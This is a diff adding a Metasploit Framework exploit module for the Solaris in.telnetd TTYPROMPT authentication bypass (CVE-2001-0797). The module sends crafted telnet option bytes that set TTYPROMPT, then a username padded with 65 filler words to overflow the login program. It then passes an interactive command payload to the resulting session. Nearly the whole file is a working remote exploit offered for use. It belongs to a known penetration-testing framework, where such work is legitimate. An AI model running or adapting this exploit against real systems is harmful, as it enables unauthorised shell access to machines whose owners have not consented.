@@ -1,0 +1,109 @@
+##
+# $Id: ttyprompt.rb 4501 2007-03-06 01:43:48Z mc $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+
+require 'msf/core'
+
+module Msf
+
+class Exploits::Solaris::Telnet::TTYPrompt_Auth_Bypass < Msf::Exploit::Remote
+
+	include Exploit::Remote::Tcp
+
+	def initialize(info = {})
+		super(update_info(info,	
+			'Name'           => 'Solaris in.telnetd TTYPROMPT Buffer Overflow',
+			'Description'    => %q{
+				This module uses a buffer overflow in the Solaris 'login'
+			application to bypass authentication in the telnet daemon. 
+			},
+			'Author'         => [ 'MC', 'cazz' ],
+			'License'        => MSF_LICENSE,
+			'Version'        => '$Revision: 4501 $',
+			'References'     =>
+				[
+					[ 'BID', '5531'],
+					[ 'CVE', '2001-0797'],
+					[ 'MIL', '66'],
+
+				],
+			'Privileged'     => false,
+			'Platform'       => ['unix', 'solaris'],
+			'Arch'           => ARCH_CMD,
+			'Payload'        =>
+				{
+					'Space'    => 2000,
+					'BadChars' => '',
+					'DisableNops' => true,
+				},
+			'PayloadCompat' =>
+				{
+					"PayloadType"    => "cmd_interact",
+				},
+			'Targets'        => 
+				[
+					['Automatic', { }],
+				],
+			'DisclosureDate' => 'Jan 18 2002',
+			'DefaultTarget' => 0))
+			
+			register_options(
+				[
+					Opt::RPORT(23),
+					OptString.new('USER', [ true, "The username to use",     "bin" ]),
+				], self.class)
+	end
+
+	def exploit
+		connect
+	
+		banner = sock.get_once
+		
+		print_status('Setting TTYPROMPT...')
+		
+		req = 
+			"\xff\xfc\x18" +
+			"\xff\xfc\x1f" +
+			"\xff\xfc\x21" +
+			"\xff\xfc\x23" +
+			"\xff\xfb\x22" +
+			"\xff\xfc\x24" +
+			"\xff\xfb\x27" +
+			"\xff\xfb\x00" +
+			"\xff\xfa\x27\x00" +
+			"\x00TTYPROMPT" +
+			"\x01" + 
+			rand_text_alphanumeric(6) + 
+			"\xff\xf0"	
+		
+		sock.put(req)
+		sleep(0.25)
+		
+		print_status('Sending username...')
+	
+		filler = rand_text_alpha(rand(10) + 1)
+ 
+		req << datastore['USER'] + (" #{filler}" * 65) 
+		
+		sock.put(req + "\n\n\n")
+
+		sleep(0.25)
+		sock.get_once
+		
+		sock.put(payload.encoded + "\n")
+
+		sleep(0.25)
+		
+		handler
+	end
+
+end
+end	
